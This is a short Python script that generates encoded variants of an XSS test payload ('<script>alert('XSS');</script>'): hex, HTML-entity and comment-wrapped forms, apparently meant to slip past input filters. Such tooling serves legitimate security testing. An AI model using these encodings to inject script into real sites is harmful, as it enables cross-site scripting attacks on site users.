import urllib.parse

def generate_payloads(base_payload):
    # Obfuscated payload with spaces and comments
    obfuscated = base_payload.replace('<', '<!--').replace('>', '-->')
    
    # Encode characters into their hexadecimal equivalent
    hex_encoded = ''.join(f'%{ord(c):x}' for c in base_payload)

    # HTML entity encoding
    html_encoded = ''.join(f'&#x{ord(c):x};' for c in base_payload)

    return {
        "original": base_payload,
        "obfuscated": obfuscated,
        "hex_encoded": hex_encoded,
        "html_encoded": html_encoded
    }

# Example base payload (simple script injection)
base_payload = "<script>alert('XSS');</script>"

payloads = generate_payloads(base_payload)

# Display the generated payloads
for method, payload in payloads.items():
    print(f"{method}: {payload}\n")
